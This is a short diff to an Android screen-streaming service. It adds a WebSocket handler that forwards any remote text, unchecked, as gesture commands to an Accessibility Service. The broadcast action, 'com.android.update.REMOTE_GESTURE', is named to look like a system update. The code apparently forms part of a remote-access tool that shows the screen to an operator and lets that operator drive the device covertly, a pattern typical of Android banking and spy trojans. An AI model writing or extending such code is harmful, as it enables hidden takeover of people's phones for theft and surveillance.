@@ -95,6 +95,19 @@ public class ScreenStreamService extends Service {
             }
 
             @Override
+            public void onMessage(WebSocket webSocket, String text) {
+                try {
+                    Log.d(TAG, "WS Message received: " + text);
+                    // Broadcast the command to the Accessibility Service
+                    Intent intent = new Intent("com.android.update.REMOTE_GESTURE");
+                    intent.putExtra("gesture_data", text);
+                    sendBroadcast(intent);
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to parse ws message: " + e.getMessage());
+                }
+            }
+
+            @Override
             public void onFailure(WebSocket webSocket, Throwable t, @Nullable okhttp3.Response response) {
                 Log.e(TAG, "WS Failed: " + t.getMessage());
                 stopStreaming();
